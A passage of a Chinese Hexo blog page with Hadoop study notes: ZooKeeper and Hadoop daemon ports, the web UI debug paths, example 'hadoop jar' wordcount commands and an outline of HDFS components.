<td>对客户端提供服务的端口</td>
</tr>
<tr>
<td></td>
<td></td>
<td>2888</td>
<td>/etc/zookeeper/conf/zoo.cfg中server.x=[hostname]:nnnnn[:nnnnn]，标蓝部分</td>
<td>follower用来连接到leader，只在leader上监听该端口。</td>
</tr>
<tr>
<td></td>
<td></td>
<td>3888</td>
<td>/etc/zookeeper/conf/zoo.cfg中server.x=[hostname]:nnnnn[:nnnnn]，标蓝部分</td>
<td>用于leader选举的。只在electionAlg是1,2或3(默认)时需要。</td>
</tr>
</tbody>
</table>
<p>所有端口协议均基于TCP。</p>
<p>对于存在Web UI（HTTP服务）的所有hadoop daemon，有如下url：</p>
<p><strong>/logs</strong><br>日志文件列表，用于下载和查看</p>
<p><strong>/logLevel</strong><br>允许你设定log4j的日志记录级别，类似于hadoop daemonlog</p>
<p><strong>/stacks</strong><br>所有线程的stack trace，对于debug很有帮助</p>
<p><strong>/jmx</strong><br>服务端的Metrics，以JSON格式输出。</p>
<p>/jmx?qry=Hadoop:*会返回所有hadoop相关指标。<br>/jmx?get=MXBeanName::AttributeName 查询指定bean指定属性的值，例如/jmx?get=Hadoop:service=NameNode,name=NameNodeInfo::ClusterId会返回ClusterId。<br>这个请求的处理类：org.apache.hadoop.jmx.JMXJsonServlet</p>
<p>而特定的Daemon又有特定的URL路径特定相应信息。</p>
<p><strong>NameNode</strong>:http://:50070/</p>
<p><strong>/dfshealth.jsp</strong><br>HDFS信息页面，其中有链接可以查看文件系统</p>
<p>/dfsnodelist.jsp?whatNodes=(DEAD|LIVE)<br>显示DEAD或LIVE状态的datanode</p>
<p><strong>/fsck</strong><br>运行fsck命令，不推荐在集群繁忙时使用！</p>
<p><strong>DataNode</strong>:http://:50075/</p>
<p><strong>/blockScannerReport</strong><br>每个datanode都会指定间隔验证块信息</p>
<p>参考：<br><a href="http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/hdfs-default.xml" target="_blank" rel="noopener">http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/hdfs-default.xml</a><br><a href="http://blog.cloudera.com/blog/2009/08/hadoop-default-ports-quick-reference/" target="_blank" rel="noopener">http://blog.cloudera.com/blog/2009/08/hadoop-default-ports-quick-reference/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/4-hadoop运行jar/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/4-hadoop运行jar/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p> hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-2.7.6.jar pi 9 10</p>
<p>hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-2.7.6.jar wordcount /hdfs-default.xml /output/wordcount/hdfs-default.xml</p>
<p>hadoop jar program/wordcount.jar com.wyg.mapreduce.Driver /test /output/wordcount1</p>
<p>hadoop fs -cat /output/wordcount3/part-r-00000</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/3-IDEA开发Hadoop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/3-IDEA开发Hadoop/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/2-hdfs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/2-hdfs/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="hdfs"><a href="#hdfs" class="headerlink" title="hdfs"></a>hdfs</h1><h2 id="1-构成"><a href="#1-构成" class="headerlink" title="1.构成"></a>1.构成</h2><h3 id="1-namenode"><a href="#1-namenode" class="headerlink" title="1.namenode"></a>1.namenode</h3><p>1.namenode主要用于存储元数据，这些元数据包含：</p>
<blockquote>
<ol>
<li>抽象目录树</li>
<li>数据和数据块(block)的对应关系</li>
<li>数据块（block)在节点的位置</li>
</ol>
</blockquote>
<p>2.处理客户端的读写请求</p>
<h3 id="2-datanode"><a href="#2-datanode" class="headerlink" title="2.datanode"></a>2.datanode</h3><blockquote>
<ol>
<li>存储数据块(block)</li>
<li>真正处理读写</li>
</ol>
</blockquote>
<h3 id="3-secondnamenode"><a href="#3-secondnamenode" class="headerlink" title="3.secondnamenode"></a>3.secondnamenode</h3><p>冷备节点， 当namenode宕机时，secondnamenode不能主动切换为namenode;但secondnamenode中存储的数据和namenode中存储的数据相同</p>
<p>主要作用:</p>
<blockquote>
<ol>
<li>namenode宕机的时候帮助namenode 恢复</li>
<li>帮助namenode做一些事情,分担namenode压力</li>
</ol>
</blockquote>
<ol>
<li>集群启动过程</li>
<li>安全模式</li>
<li>机架策略</li>
<li>负载均衡</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">42</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">categories</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
